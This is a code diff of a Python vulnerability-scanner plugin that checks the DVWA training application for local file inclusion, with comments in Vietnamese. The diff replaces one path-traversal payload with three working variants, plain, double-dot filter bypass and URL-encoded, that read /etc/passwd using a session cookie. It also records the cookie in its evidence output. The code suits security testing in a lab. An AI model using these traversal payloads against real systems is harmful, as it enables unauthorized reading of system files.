@@ -11,45 +11,52 @@ class DVWALFIPlugin(BasePlugin):
             "name": "DVWA Local File Inclusion",
             "cvss_score": 7.5,
             "service": "http",
-            "version": "dvwa"
+            "vuln_type": "lfi"
         }
 
     def match(self, service_info: Dict[str, Any]) -> bool:
-        return service_info.get("service", "").lower() in ["http", "https"]
+        return service_info.get("service","") in ["http","https"]
 
     def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
-        try:
-            # 1. Payload khai thác cụ thể
-            payload = "?page=../../../../../../etc/passwd"
-            url = f"http://{target_ip}:{target_port}/vulnerabilities/fi/{payload}"
-            req = urllib.request.Request(url)
-            
-            # 2. Lấy session từ bộ nhớ
-            dynamic_cookie = context.get("session_cookie", "")
-            if not dynamic_cookie:
-                return {"status": "PENDING", "evidence": "Chưa có Session Cookie."}
-                
-            req.add_header("Cookie", dynamic_cookie) 
-            
-            # 3. Gửi request và đọc dữ liệu
-            response = urllib.request.urlopen(req, timeout=5)
-            body = response.read().decode('utf-8')
-            
-            # 4. Xác minh và trích xuất bằng chứng
-            if "root:x:0:0:" in body:
-                # Chỉ lấy 5 dòng đầu của /etc/passwd để hiển thị cho gọn
-                passwd_snippet = "\n".join(body.split('\n')[:5])
-                
-                # Ghi lại toàn bộ bằng chứng thép
-                evidence_detail = (
-                    f"Trích xuất thành công tệp hệ thống.\n"
-                    f"      - Payload sử dụng : {payload}\n"
-                    f"      - Session Cookie  : {dynamic_cookie}\n"
-                    f"      - Dữ liệu thu được (5 dòng đầu):\n{passwd_snippet}"
-                )
-                return {"status": "CONFIRMED", "evidence": evidence_detail}
-            else:
-                return {"status": "FALSE_POSITIVE", "evidence": "Không đọc được tệp passwd."}
-                
-        except Exception as e:
-            return {"status": "PENDING", "evidence": f"HTTP Error: {str(e)}"}
+        cookie = context.get("session_cookie","")
+        if not cookie:
+            return {"status": "PENDING", "evidence": "Chưa có session cookie"}
+
+        payloads = [
+            ("?page=../../../../../../etc/passwd",           "root:x:0:0:", "basic traversal"),
+            ("?page=....//....//....//etc/passwd",           "root:x:0:0:", "double-dot bypass"),
+            ("?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd",      "root:x:0:0:", "URL encoded traversal"),
+        ]
+
+        url_base = f"http://{target_ip}:{target_port}/vulnerabilities/fi/"
+
+        for payload, marker, technique in payloads:
+            try:
+                url = f"{url_base}{payload}"
+                print(f"      [LFI] [{technique}] Payload: {payload}")
+                req = urllib.request.Request(url)
+                req.add_header("Cookie", cookie)
+                resp = urllib.request.urlopen(req, timeout=5)
+                body = resp.read().decode('utf-8')
+                snippet = body[:200].replace('\n',' ')
+                print(f"      [LFI] Response: {snippet[:80]}...")
+
+                if marker in body:
+                    passwd_lines = "\n".join(body.split('\n')[:5])
+                    print(f"      [LFI] ✓ CONFIRMED với technique: {technique}")
+                    return {
+                        "status": "CONFIRMED",
+                        "evidence": (
+                            f"LFI thành công - đọc được file hệ thống.\n"
+                            f"      - Technique  : {technique}\n"
+                            f"      - Payload    : {payload}\n"
+                            f"      - Cookie     : {cookie}\n"
+                            f"      - /etc/passwd (5 dòng đầu):\n{passwd_lines}"
+                        )
+                    }
+                else:
+                    print(f"      [LFI] ✗ Payload không trigger — thử tiếp")
+            except Exception as e:
+                print(f"      [LFI] ✗ Error: {e}")
+
+        return {"status": "FALSE_POSITIVE", "evidence": "Tất cả LFI payload không khai thác được"}
